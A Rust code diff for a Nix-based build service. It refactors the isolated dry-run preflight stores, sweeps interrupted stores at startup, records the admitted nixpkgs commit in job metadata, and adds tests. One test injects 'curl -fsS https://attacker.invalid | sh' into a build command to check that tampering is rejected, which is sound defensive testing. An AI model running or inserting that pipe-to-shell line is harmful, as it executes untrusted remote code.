@@ -479,6 +479,24 @@ async fn sweep_stale_job_dirs(config: &AppConfig) {
             }
         }
     }
+    // Isolated preflight stores a restart interrupted. The detected-commit
+    // check keeps its stores inside its own work directory.
+    if let Ok(mut entries) = tokio::fs::read_dir(&config.build.work_dir).await {
+        while let Ok(Some(entry)) = entries.next_entry().await {
+            let stale = entry
+                .file_name()
+                .to_str()
+                .and_then(|name| name.strip_prefix("source-policy-store-"))
+                .is_some_and(|nonce| {
+                    nonce.len() == 32 && nonce.bytes().all(|byte| byte.is_ascii_hexdigit())
+                });
+            if stale {
+                let path = entry.path();
+                let _ = tokio::task::spawn_blocking(move || remove_private_tree(&path)).await;
+                removed += 1;
+            }
+        }
+    }
     if removed > 0 {
         info!(removed, "removed stale Nest build job directories");
     }
@@ -581,10 +599,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
             "",
             0,
             None,
-            Some(build_result_metadata(
+            Some(admitted_result_metadata(
                 &state.config,
                 &job,
-                Some(&target),
+                &target,
+                admitted_commit.as_deref(),
+                detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                 Some("insufficient_disk_space"),
             )),
         )
@@ -607,10 +627,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 "",
                 0,
                 None,
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some("capacity_check_failed"),
                 )),
             )
@@ -651,10 +673,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
             "",
             0,
             None,
-            Some(build_result_metadata(
+            Some(admitted_result_metadata(
                 &state.config,
                 &job,
-                Some(&target),
+                &target,
+                admitted_commit.as_deref(),
+                detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                 Some(error_kind),
             )),
         )
@@ -672,10 +696,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
             "",
             0,
             None,
-            Some(build_result_metadata(
+            Some(admitted_result_metadata(
                 &state.config,
                 &job,
-                Some(&target),
+                &target,
+                admitted_commit.as_deref(),
+                detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                 Some("nix_daemon_unavailable"),
             )),
         )
@@ -690,6 +716,7 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
             &spec,
             &target,
             &source,
+            admitted_commit.as_deref(),
             detected.as_ref().map(|ready| ready.nar_hash.as_str()),
         )
         .await;
@@ -730,10 +757,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 "",
                 0,
                 None,
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some("source_build_blocked"),
                 )),
             )
@@ -742,10 +771,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
         };
         match preflight_source_build_check_for_profile(&state.config, &command, profile).await {
             Ok(offenders) if !offenders.is_empty() => {
-                let mut metadata = build_result_metadata(
+                let mut metadata = admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some("source_build_blocked"),
                 );
                 if let Some(map) = metadata.as_object_mut() {
@@ -782,10 +813,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                     "",
                     0,
                     None,
-                    Some(build_result_metadata(
+                    Some(admitted_result_metadata(
                         &state.config,
                         &job,
-                        Some(&target),
+                        &target,
+                        admitted_commit.as_deref(),
+                        detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                         Some("source_policy_preflight_failed"),
                     )),
                 )
@@ -830,10 +863,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                         "",
                         0,
                         Some(exit_code.into()),
-                        Some(build_result_metadata(
+                        Some(admitted_result_metadata(
                             &state.config,
                             &job,
-                            Some(&target),
+                            &target,
+                            admitted_commit.as_deref(),
+                            detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                             Some("output_validation_failed"),
                         )),
                     )
@@ -852,10 +887,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                     &output_info.output_sha256,
                     output_info.output_size_bytes,
                     Some(exit_code.into()),
-                    Some(build_result_metadata(
+                    Some(admitted_result_metadata(
                         &state.config,
                         &job,
-                        Some(&target),
+                        &target,
+                        admitted_commit.as_deref(),
+                        detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                         Some("artifact_too_large"),
                     )),
                 )
@@ -896,10 +933,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                         &output_info.output_sha256,
                         output_info.output_size_bytes,
                         Some(exit_code.into()),
-                        Some(build_result_metadata(
+                        Some(admitted_result_metadata(
                             &state.config,
                             &job,
-                            Some(&target),
+                            &target,
+                            admitted_commit.as_deref(),
+                            detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                             Some("cache_export_failed"),
                         )),
                     )
@@ -968,10 +1007,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 "",
                 0,
                 Some(exit_code.into()),
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some(error_kind),
                 )),
             )
@@ -988,10 +1029,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 "",
                 0,
                 None,
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some("cancelled"),
                 )),
             )
@@ -1008,10 +1051,12 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 "",
                 0,
                 None,
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     &job,
-                    Some(&target),
+                    &target,
+                    admitted_commit.as_deref(),
+                    detected.as_ref().map(|ready| ready.nar_hash.as_str()),
                     Some("build_timeout"),
                 )),
             )
@@ -1031,6 +1076,7 @@ async fn execute_replica_copy(
     spec: &ValidatedBuildSpec,
     target: &BuildTargetConfig,
     source: &ValidatedClosureSource,
+    admitted_commit: Option<&str>,
     nixpkgs_nar_hash: Option<&str>,
 ) -> Result<()> {
     db::update_build_job_progress(
@@ -1071,10 +1117,12 @@ async fn execute_replica_copy(
                 "",
                 0,
                 None,
-                Some(build_result_metadata(
+                Some(admitted_result_metadata(
                     &state.config,
                     job,
-                    Some(target),
+                    target,
+                    admitted_commit,
+                    nixpkgs_nar_hash,
                     Some("replica_copy_failed"),
                 )),
             )
@@ -1093,10 +1141,12 @@ async fn execute_replica_copy(
             &summary.output_sha256,
             summary.output_size_bytes,
             None,
-            Some(build_result_metadata(
+            Some(admitted_result_metadata(
                 &state.config,
                 job,
-                Some(target),
+                target,
+                admitted_commit,
+                nixpkgs_nar_hash,
                 Some("artifact_too_large"),
             )),
         )
@@ -2514,96 +2564,196 @@ pub(crate) async fn unadmitted_local_derivations(
     command: &NixBuildCommand,
     profile: &WorkstationBuildProfile,
 ) -> Result<UnadmittedDerivations> {
-    let session = DryRunSession::start(config, command).await?;
-    let result = session.classify(profile).await;
-    let cleanup = session.finish().await;
-    match (result, cleanup) {
-        (Ok(value), Ok(())) => Ok(value),
-        (Err(error), _) | (Ok(_), Err(error)) => Err(error),
-    }
+    DetachedDryRun::run(config, command, profile)
+        .await?
+        .classify(profile)
 }
 
-/// One dry run kept in its isolated store, so the detected-commit check can
-/// classify a single evaluation with several profiles. `finish` removes the
-/// store; dropping an unfinished session removes it synchronously.
-pub(crate) struct DryRunSession {
-    store_root: PathBuf,
-    program: String,
+/// Largest source file whose bytes a detached dry run keeps a hash of.
+const MAX_DETACHED_SOURCE_BYTES: u64 = 16 * 1024 * 1024;
+
+/// A dry run whose isolated store is already removed: the local work, each
+/// derivation's record and the sha256 of every source file they reference
+/// (and of the substituted buildEnv helper). The detected-commit check holds
+/// one per reference and classifies it again with the final profile without
+/// keeping a store (each holds a nixpkgs source of about 330 MB).
+pub(crate) struct DetachedDryRun {
     graph: DryRunGraph,
-    finished: bool,
+    source_sha256: BTreeMap<String, String>,
 }
 
-impl DryRunSession {
-    pub(crate) async fn start(config: &AppConfig, command: &NixBuildCommand) -> Result<Self> {
-        tokio::fs::create_dir_all(&config.build.work_dir)
-            .await
-            .with_context(|| {
-                format!(
-                    "create build work directory {}",
-                    config.build.work_dir.display()
-                )
-            })?;
-        let mut store_nonce = [0u8; 16];
-        OsRng.fill_bytes(&mut store_nonce);
-        let store_root = config
-            .build
-            .work_dir
-            .join(format!("source-policy-store-{}", hex::encode(store_nonce)));
-        tokio::fs::create_dir(&store_root)
-            .await
-            .with_context(|| format!("create isolated preflight store {}", store_root.display()))?;
-        let mut session = Self {
-            store_root,
-            program: command.program.clone(),
-            graph: DryRunGraph::default(),
-            finished: false,
-        };
-        match dry_run_graph_in_store(
-            config,
-            command,
-            &session.store_root,
-            PreflightLimits::default(),
-        )
-        .await
-        {
-            Ok(graph) => {
-                session.graph = graph;
-                Ok(session)
+impl DetachedDryRun {
+    /// `profile` names the buildEnv helper to fetch when a local derivation
+    /// uses a substituted one.
+    pub(crate) async fn run(
+        config: &AppConfig,
+        command: &NixBuildCommand,
+        profile: &WorkstationBuildProfile,
+    ) -> Result<Self> {
+        let store = IsolatedStore::create(&config.build.work_dir).await?;
+        let result = async {
+            let limits = PreflightLimits::default();
+            let graph = dry_run_graph_in_store(config, command, &store.root, limits).await?;
+            let mut paths = graph
+                .derivations
+                .values()
+                .flat_map(|drv| derivation_input_sources(drv).unwrap_or_default())
+                .collect::<BTreeSet<_>>();
+            if link_farm_builder_needed(&graph, profile) {
+                let builder = profile.path(TRUSTED_LINK_FARM_BUILDER.path).into_owned();
+                // A failed fetch leaves no hash; classification then fails.
+                let _ =
+                    fetch_link_farm_builder(&command.program, &store.root, &builder, limits).await;
+                paths.insert(builder);
             }
-            Err(error) => {
-                let _ = session.finish().await;
-                Err(error)
-            }
+            let source_sha256 = paths
+                .into_iter()
+                .filter_map(|path| {
+                    isolated_store_source_sha256(&store.root, &path).map(|sha256| (path, sha256))
+                })
+                .collect();
+            anyhow::Ok(Self {
+                graph,
+                source_sha256,
+            })
         }
+        .await;
+        let cleanup = store.remove().await;
+        let run = result?;
+        cleanup?;
+        Ok(run)
     }
 
-    pub(crate) async fn classify(
+    pub(crate) fn classify(
         &self,
         profile: &WorkstationBuildProfile,
     ) -> Result<UnadmittedDerivations> {
-        classify_graph_in_store(
-            &self.graph,
-            &self.program,
-            profile,
-            &self.store_root,
-            PreflightLimits::default(),
-        )
-        .await
-    }
-
-    pub(crate) async fn finish(mut self) -> Result<()> {
-        self.finished = true;
-        remove_source_policy_store(&self.store_root).await
+        let verify_source = |path: &str, expected: &str| {
+            self.source_sha256
+                .get(path)
+                .is_some_and(|sha256| sha256 == expected)
+        };
+        if link_farm_builder_needed(&self.graph, profile) {
+            let builder = profile.path(TRUSTED_LINK_FARM_BUILDER.path);
+            if !std::iter::once(TRUSTED_LINK_FARM_BUILDER_SHA256)
+                .chain(profile.any_builder_file_counterparts(TRUSTED_LINK_FARM_BUILDER_SHA256))
+                .any(|expected| verify_source(&builder, expected))
+            {
+                bail!("signed substitute for the pinned buildEnv helper could not be verified");
+            }
+        }
+        Ok(classify_graph(&self.graph, profile, &verify_source))
     }
 }
 
-impl Drop for DryRunSession {
+/// An isolated preflight store below `work_dir`, removed by `remove` or,
+/// failing that, synchronously when dropped (for example when a timeout
+/// cancels the check).
+struct IsolatedStore {
+    root: PathBuf,
+    removed: bool,
+}
+
+impl IsolatedStore {
+    async fn create(work_dir: &Path) -> Result<Self> {
+        tokio::fs::create_dir_all(work_dir)
+            .await
+            .with_context(|| format!("create build work directory {}", work_dir.display()))?;
+        let mut store_nonce = [0u8; 16];
+        OsRng.fill_bytes(&mut store_nonce);
+        let root = work_dir.join(format!("source-policy-store-{}", hex::encode(store_nonce)));
+        tokio::fs::create_dir(&root)
+            .await
+            .with_context(|| format!("create isolated preflight store {}", root.display()))?;
+        Ok(Self {
+            root,
+            removed: false,
+        })
+    }
+
+    async fn remove(mut self) -> Result<()> {
+        self.removed = true;
+        remove_source_policy_store(&self.root).await
+    }
+}
+
+impl Drop for IsolatedStore {
     fn drop(&mut self) {
-        if !self.finished {
-            let _ = make_source_policy_directories_owner_writable(&self.store_root);
-            let _ = fs::remove_dir_all(&self.store_root);
+        if !self.removed {
+            let _ = make_source_policy_directories_owner_writable(&self.root);
+            let _ = fs::remove_dir_all(&self.root);
         }
     }
+}
+
+/// Remove a private directory tree that may contain read-only store
+/// directories. Best effort: failures leave it for the next startup.
+pub(crate) fn remove_private_tree(path: &Path) {
+    if fs::symlink_metadata(path).is_ok_and(|metadata| metadata.is_dir()) {
+        let _ = make_source_policy_directories_owner_writable(path);
+        let _ = fs::remove_dir_all(path);
+    }
+}
+
+/// sha256 of a regular source file in an isolated store, by logical path.
+fn isolated_store_source_sha256(root: &Path, logical_path: &str) -> Option<String> {
+    let relative = Path::new(logical_path).strip_prefix("/nix/store").ok()?;
+    if relative
+        .components()
+        .any(|component| !matches!(component, std::path::Component::Normal(_)))
+    {
+        return None;
+    }
+    let physical = root.join("nix/store").join(relative);
+    let metadata = fs::symlink_metadata(&physical).ok()?;
+    if !metadata.is_file() || metadata.len() > MAX_DETACHED_SOURCE_BYTES {
+        return None;
+    }
+    fs::read(physical)
+        .ok()
+        .map(|bytes| hex::encode(Sha256::digest(bytes)))
+}
+
+/// Substitute exactly the buildEnv helper into an isolated store, with local
+/// and remote builds disabled and signatures required.
+async fn fetch_link_farm_builder(
+    program: &str,
+    store_root: &Path,
+    builder: &str,
+    limits: PreflightLimits,
+) -> Result<bool> {
+    let store_url = format!("local?root={}", store_root.display());
+    let mut fetch = crate::nix_command::tokio_command(program);
+    fetch.args([
+        "--store",
+        &store_url,
+        "build",
+        "--no-link",
+        "--max-jobs",
+        "0",
+        "--option",
+        "builders",
+        "",
+        "--option",
+        "require-sigs",
+        "true",
+        "--option",
+        "allow-import-from-derivation",
+        "false",
+        "--option",
+        "accept-flake-config",
+        "false",
+        builder,
+    ]);
+    let output = run_bounded_command(
+        fetch,
+        limits.dry_run_timeout,
+        limits.dry_run_stdout_max_bytes,
+        limits.dry_run_stderr_max_bytes,
+        "fetch pinned buildEnv helper",
+    )
+    .await?;
+    Ok(output.status.success())
 }
 
 async fn preflight_unadmitted_in_store(
@@ -2790,63 +2940,43 @@ async fn classify_graph_in_store(
     store_root: &Path,
     limits: PreflightLimits,
 ) -> Result<UnadmittedDerivations> {
-    let store_url = format!("local?root={}", store_root.display());
-    let would_build = graph.would_build.clone();
-    let derivations = graph.derivations.clone();
-    let would_build_set = would_build.iter().cloned().collect::<HashSet<_>>();
-
     // A substituted buildEnv helper is not downloaded by --dry-run. Its bytes
     // are still required for the independent pinned-source check below. Fetch
     // only that exact reviewed store output, with local and remote compilation
     // disabled and normal cache signature verification required.
     let link_farm_builder = profile.path(TRUSTED_LINK_FARM_BUILDER.path);
-    let link_farm_builder_drv = profile.path(TRUSTED_LINK_FARM_BUILDER.drv_path);
-    if !would_build_set.contains(link_farm_builder_drv.as_ref())
-        && derivations.values().any(|drv| {
-            input_drv_output_reference(drv, &link_farm_builder).is_some_and(|input| {
-                input.drv_path == link_farm_builder_drv
-                    && input.output == TRUSTED_LINK_FARM_BUILDER.output
-            })
-        })
+    if link_farm_builder_needed(graph, profile)
         && !link_farm_builder_is_reviewed(profile, store_root, &link_farm_builder)
     {
-        let mut fetch = crate::nix_command::tokio_command(program);
-        fetch.args([
-            "--store",
-            &store_url,
-            "build",
-            "--no-link",
-            "--max-jobs",
-            "0",
-            "--option",
-            "builders",
-            "",
-            "--option",
-            "require-sigs",
-            "true",
-            "--option",
-            "allow-import-from-derivation",
-            "false",
-            "--option",
-            "accept-flake-config",
-            "false",
-            &link_farm_builder,
-        ]);
-        let output = run_bounded_command(
-            fetch,
-            limits.dry_run_timeout,
-            limits.dry_run_stdout_max_bytes,
-            limits.dry_run_stderr_max_bytes,
-            "fetch pinned buildEnv helper",
-        )
-        .await?;
-        if !output.status.success()
-            || !link_farm_builder_is_reviewed(profile, store_root, &link_farm_builder)
-        {
+        let fetched =
+            fetch_link_farm_builder(program, store_root, &link_farm_builder, limits).await?;
+        if !fetched || !link_farm_builder_is_reviewed(profile, store_root, &link_farm_builder) {
             bail!("signed substitute for the pinned buildEnv helper could not be verified");
         }
     }
 
+    Ok(classify_graph(
+        graph,
+        profile,
+        &|path: &str, expected: &str| {
+            isolated_store_source_matches_sha256(store_root, path, expected)
+        },
+    ))
+}
+
+/// Classify a dry run's local work with `profile`; `verify_source` checks a
+/// source file's bytes against a reviewed hash.
+fn classify_graph<F>(
+    graph: &DryRunGraph,
+    profile: &WorkstationBuildProfile,
+    verify_source: &F,
+) -> UnadmittedDerivations
+where
+    F: Fn(&str, &str) -> bool,
+{
+    let would_build = graph.would_build.clone();
+    let derivations = graph.derivations.clone();
+    let would_build_set = would_build.iter().cloned().collect::<HashSet<_>>();
     // NixOS system closures contain a DAG of small, configuration-only
     // derivations. A reviewed link farm can legitimately consume another
     // reviewed materializer from the same dry-run set (for example the GTK
@@ -2854,14 +2984,11 @@ async fn classify_graph_in_store(
     // point instead of treating every local dependency as source compilation.
     // A derivation joins the trusted set only after every one of its local
     // input derivations has independently passed the strict grammar below.
-    let verify_source = |path: &str, expected: &str| {
-        isolated_store_source_matches_sha256(store_root, path, expected)
-    };
     let trusted_local = classify_trusted_local_derivations_for_profile(
         profile,
         &would_build,
         &derivations,
-        &verify_source,
+        verify_source,
         &would_build_set,
     );
 
@@ -2877,7 +3004,7 @@ async fn classify_graph_in_store(
                 profile,
                 path,
                 derivations.get(*path),
-                &verify_source,
+                verify_source,
                 &would_build_set,
                 &would_build_set,
             )
@@ -2886,6 +3013,9 @@ async fn classify_graph_in_store(
         .collect();
     let mut changed_builder_files = BTreeSet::new();
     for path in &paths {
+        // A changed file a counterpart of this derivation's role vouches
+        // for is not a change.
+        let scoped = profile.for_derivation(path);
         for source in derivations
             .get(path)
             .and_then(derivation_input_sources)
@@ -2905,20 +3035,20 @@ async fn classify_graph_in_store(
                 ("-wrapper.c", TRUSTED_SECURITY_WRAPPER_SHA256, "wrapper.c"),
             ] {
                 if source.ends_with(suffix)
-                    && !reviewed_source_matches(profile, &verify_source, &source, expected)
+                    && !reviewed_source_matches(&scoped, verify_source, &source, expected)
                 {
                     changed_builder_files.insert(name);
                 }
             }
         }
     }
-    Ok(UnadmittedDerivations {
+    UnadmittedDerivations {
         would_build,
         paths,
         rejected_on_their_own,
         derivations,
         changed_builder_files,
-    })
+    }
 }
 
 /// A safe store path's store item (`<hash>-<name>`).
@@ -3114,6 +3244,23 @@ where
         would_build,
         trusted_local,
     )
+}
+
+/// Whether a local derivation uses the profile's buildEnv helper as a
+/// substituted (not locally built) input: its bytes must then be fetched and
+/// checked.
+fn link_farm_builder_needed(graph: &DryRunGraph, profile: &WorkstationBuildProfile) -> bool {
+    let builder = profile.path(TRUSTED_LINK_FARM_BUILDER.path);
+    let builder_drv = profile.path(TRUSTED_LINK_FARM_BUILDER.drv_path);
+    !graph
+        .would_build
+        .iter()
+        .any(|path| path == builder_drv.as_ref())
+        && graph.derivations.values().any(|drv| {
+            input_drv_output_reference(drv, &builder).is_some_and(|input| {
+                input.drv_path == builder_drv && input.output == TRUSTED_LINK_FARM_BUILDER.output
+            })
+        })
 }
 
 /// The fetched buildEnv helper has the pin's bytes or a counterpart's (in
@@ -4587,7 +4734,7 @@ const PINNED_DESKTOP_NIXOS_GENERATOR_FINGERPRINTS: &[(&str, &str)] = &[
     ),
 ];
 
-const PINNED_NIXOS_TOPLEVEL_GENERATOR_FINGERPRINT: &str =
+pub(crate) const PINNED_NIXOS_TOPLEVEL_GENERATOR_FINGERPRINT: &str =
     "c518c8ef32da2ce4eddc5812ee50a9ce43054202c903356fadbf3a2374958426";
 
 fn reviewed_generator_fingerprints_match(normalized: &str, executable_pinned: &str) -> bool {
@@ -6017,6 +6164,27 @@ fn build_result_metadata(
         metadata.remove("error_kind");
     }
     Value::Object(metadata)
+}
+
+/// Result metadata of a job admitted at `admitted_commit`. At a detected
+/// commit it names that commit and its narHash-pinned source instead of the
+/// target's release pin.
+fn admitted_result_metadata(
+    config: &AppConfig,
+    job: &BuildJob,
+    target: &BuildTargetConfig,
+    admitted_commit: Option<&str>,
+    nixpkgs_nar_hash: Option<&str>,
+    error_kind: Option<&str>,
+) -> Value {
+    let mut metadata = build_result_metadata(config, job, Some(target), error_kind);
+    if let (Some(commit), Some(object)) = (admitted_commit, metadata.as_object_mut()) {
+        object.insert("nixpkgs_revision".to_string(), json!(commit));
+        if let Ok(flake) = nixpkgs_flake_ref(commit, nixpkgs_nar_hash) {
+            object.insert("nixpkgs_flake".to_string(), json!(flake));
+        }
+    }
+    metadata
 }
 
 fn success_result_metadata(
@@ -12960,6 +13128,7 @@ esac
                 file: "wrapper.c".to_string(),
                 sha256: "c".repeat(64),
             }],
+            normalized: Vec::new(),
         };
         let profile = base.clone().with_reviewed_content(&valid).unwrap();
         let units =
@@ -13008,6 +13177,17 @@ esac
         let mut not_stock = valid.clone();
         not_stock.stock_commands[0].reviewed = "gcc source.c".to_string();
         assert!(base.clone().with_reviewed_content(&not_stock).is_err());
+        // A normalized-only counterpart may replace only a script the pin
+        // admits by its normalized half.
+        let mut normalized = valid.clone();
+        normalized.normalized = vec![profile::NormalizedCounterpart {
+            role: "nixos-system".to_string(),
+            commit: "e".repeat(64),
+            reviewed: PINNED_NIXOS_TOPLEVEL_GENERATOR_FINGERPRINT.to_string(),
+        }];
+        assert!(base.clone().with_reviewed_content(&normalized).is_ok());
+        normalized.normalized[0].reviewed = PINNED_STANDARD_ETC_FINGERPRINT.to_string();
+        assert!(base.clone().with_reviewed_content(&normalized).is_err());
         let mut unknown_file = valid.clone();
         unknown_file.builder_files[0].file = "setup.sh".to_string();
         assert!(base.clone().with_reviewed_content(&unknown_file).is_err());
@@ -13290,5 +13470,196 @@ esac
             classify_with(&profile, &BTreeMap::from([(renamed_path, renamed)])).is_empty(),
             "a role's content admitted another derivation"
         );
+    }
+
+    #[test]
+    fn an_organization_blueprint_shaped_like_a_reference_is_admitted_at_the_commit() {
+        // A reference Blueprint at the pin and at a commit with a newer
+        // gnused (the system closure's script names it), and an organization
+        // Blueprint from the same modules: another host name, its own
+        // activation script and its own policy file.
+        let pin_graph = regional_gnome_derivations();
+        let builtin = WorkstationBuildProfile::builtin();
+        let pin = local_derivations(builtin, &pin_graph, &synthetic_pinned_source);
+        assert!(pin.rejected_on_their_own.is_empty());
+        let (base, items) = shifted_detected_profile(BTreeSet::new());
+        let bump = [("gnused-4.9", "gnused-4.10")];
+        let reference = render_at_detected_commit(&pin_graph, &items, &bump);
+        let mut counterparts = Counterparts::default();
+        add_counterparts(
+            &base,
+            &pin_builder_files(),
+            &pin,
+            &local_derivations(&base, &reference, &synthetic_pinned_source),
+            &mut counterparts,
+        );
+        let profile = base
+            .clone()
+            .with_reviewed_content(&counterparts.content())
+            .unwrap();
+        assert_eq!(classify_with(&profile, &reference).len(), reference.len());
+
+        let toplevel = |graph: &BTreeMap<String, Value>| {
+            graph
+                .keys()
+                .find(|path| path.contains("-nixos-system-"))
+                .cloned()
+                .unwrap()
+        };
+        // The organization's own activation script: another output path,
+        // which the system closure's script runs as an executable.
+        let activate = reference
+            .values()
+            .find(|drv| derivation_name(drv, &derivation_attributes(drv)) == Some("activate"))
+            .unwrap();
+        let activate_output = activate["outputs"]["out"]["path"]
+            .as_str()
+            .unwrap()
+            .to_string();
+        let activate_output = activate_output
+            .strip_prefix("/nix/store/")
+            .unwrap_or(&activate_output);
+        let activate_hash = activate_output[..32].to_string();
+        let mut organization = BTreeMap::new();
+        for (path, drv) in &reference {
+            let mut text = drv.to_string();
+            let mut path = path.clone();
+            for (from, to) in [
+                (
+                    "nixos-system-tiaris-nest-build",
+                    "nixos-system-school-lab-12",
+                ),
+                (activate_hash.as_str(), "00000000000000000000000000000000"),
+            ] {
+                text = text.replace(from, to);
+                path = path.replace(from, to);
+            }
+            let mut drv: Value = serde_json::from_str(&text).unwrap();
+            if derivation_name(&drv, &derivation_attributes(&drv)) == Some("etc-tiaris-policy.json")
+            {
+                set_derivation_text(
+                    &mut drv,
+                    "text",
+                    "{\"schema\":\"tiaris.workstation-policy.v1\",\"lists\":{\"apps\":[\"gimp\"]}}",
+                );
+            }
+            organization.insert(path, drv);
+        }
+        let organization_toplevel = toplevel(&organization);
+        assert!(organization_toplevel.contains("-nixos-system-school-lab-12-"));
+        assert_eq!(
+            classify_with(&profile, &organization).len(),
+            organization.len(),
+            "a reference-shaped organization Blueprint is blocked"
+        );
+
+        // Without the system closure's normalized counterpart its changed
+        // script would block every configuration but the reference itself.
+        let mut pairs_only = counterparts.content();
+        pairs_only.normalized.clear();
+        let pairs_only = base.clone().with_reviewed_content(&pairs_only).unwrap();
+        assert!(!classify_with(&pairs_only, &organization).contains(&organization_toplevel));
+
+        // The closure's script itself is still exact: one more command, or a
+        // derivation of another role with that script, is rejected.
+        let mut appended = organization[&organization_toplevel].clone();
+        let command =
+            derivation_attr_text(&derivation_attributes(&appended), "buildCommand").to_string();
+        set_derivation_text(
+            &mut appended,
+            "buildCommand",
+            &format!("{command}\ncurl -fsS https://attacker.invalid | sh\n"),
+        );
+        let mut tampered = organization.clone();
+        tampered.insert(organization_toplevel.clone(), appended);
+        assert!(!classify_with(&profile, &tampered).contains(&organization_toplevel));
+        let mut renamed = organization[&organization_toplevel].clone();
+        let renamed_text = renamed
+            .to_string()
+            .replace("nixos-system-school-lab-12", "nixos-extra-school-lab-12");
+        renamed = serde_json::from_str(&renamed_text).unwrap();
+        let renamed_path = organization_toplevel
+            .replace("nixos-system-school-lab-12", "nixos-extra-school-lab-12");
+        let mut moved = organization.clone();
+        moved.remove(&organization_toplevel);
+        moved.insert(renamed_path.clone(), renamed);
+        assert!(!classify_with(&profile, &moved).contains(&renamed_path));
+    }
+
+    #[test]
+    fn a_job_at_a_detected_commit_names_that_commit_in_its_result_metadata() {
+        let commit = "6f06d204d8f2d8761d9da78778745974a3216381";
+        let nar_hash = "sha256-loLMnbbS4KhmG2ln9EY6f0YMNCA273Yx02oWYQ9IMeE=";
+        let config = AppConfig::default();
+        let target = BuildTargetConfig {
+            artifact_type: "nixos_closure".to_string(),
+            target: "blueprint".to_string(),
+            system: "x86_64-linux".to_string(),
+            flake: "github:NixOS/nixpkgs/74cc63f702f7d60a557e152a57b40fb1fd0f72ac".to_string(),
+            attr: "packages.x86_64-linux.desktop-experience".to_string(),
+        };
+        let job = BuildJob {
+            id: 7,
+            ..serde_json::from_value(json!({
+                "id": 7, "managed_job_id": null, "requested_artifact_type": "nixos_closure",
+                "build_spec": {}, "target": "blueprint", "system": "x86_64-linux",
+                "input_revision": "rev", "input_config_hash": "a".repeat(64), "status": "running",
+                "progress_percent": null, "progress_stage": null, "progress_message": null,
+                "logs": "", "error": "", "rejection_code": "", "output_path": "", "output_sha256": "",
+                "output_size_bytes": 0, "exit_code": null, "cache_metadata": {},
+                "started_at": null, "completed_at": null, "cancel_requested_at": null,
+                "created_at": "2026-10-31T00:00:00Z", "updated_at": "2026-10-31T00:00:00Z"
+            }))
+            .unwrap()
+        };
+        let detected = admitted_result_metadata(
+            &config,
+            &job,
+            &target,
+            Some(commit),
+            Some(nar_hash),
+            Some("source_build_blocked"),
+        );
+        assert_eq!(detected["nixpkgs_revision"], commit);
+        assert_eq!(
+            detected["nixpkgs_flake"],
+            nixpkgs_flake_ref(commit, Some(nar_hash)).unwrap()
+        );
+        assert_eq!(detected["error_kind"], "source_build_blocked");
+        let pin = admitted_result_metadata(
+            &config,
+            &job,
+            &target,
+            Some("74cc63f702f7d60a557e152a57b40fb1fd0f72ac"),
+            None,
+            None,
+        );
+        assert_eq!(pin["nixpkgs_flake"], target.flake);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn startup_removes_interrupted_isolated_stores() {
+        use std::os::unix::fs::PermissionsExt;
+        let root =
+            std::env::temp_dir().join(format!("tiaris-nest-store-sweep-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        let mut config = AppConfig::default();
+        config.build.work_dir = root.join("work");
+        config.build.output_dir = root.join("out");
+        let store = config
+            .build
+            .work_dir
+            .join(format!("source-policy-store-{}", "a".repeat(32)));
+        let read_only = store.join("nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source");
+        std::fs::create_dir_all(&read_only).unwrap();
+        std::fs::write(read_only.join("file"), "x").unwrap();
+        std::fs::set_permissions(&read_only, std::fs::Permissions::from_mode(0o555)).unwrap();
+        let unrelated = config.build.work_dir.join("source-policy-store-other");
+        std::fs::create_dir_all(&unrelated).unwrap();
+        sweep_stale_job_dirs(&config).await;
+        assert!(!store.exists());
+        assert!(unrelated.exists());
+        let _ = std::fs::remove_dir_all(root);
     }
 }
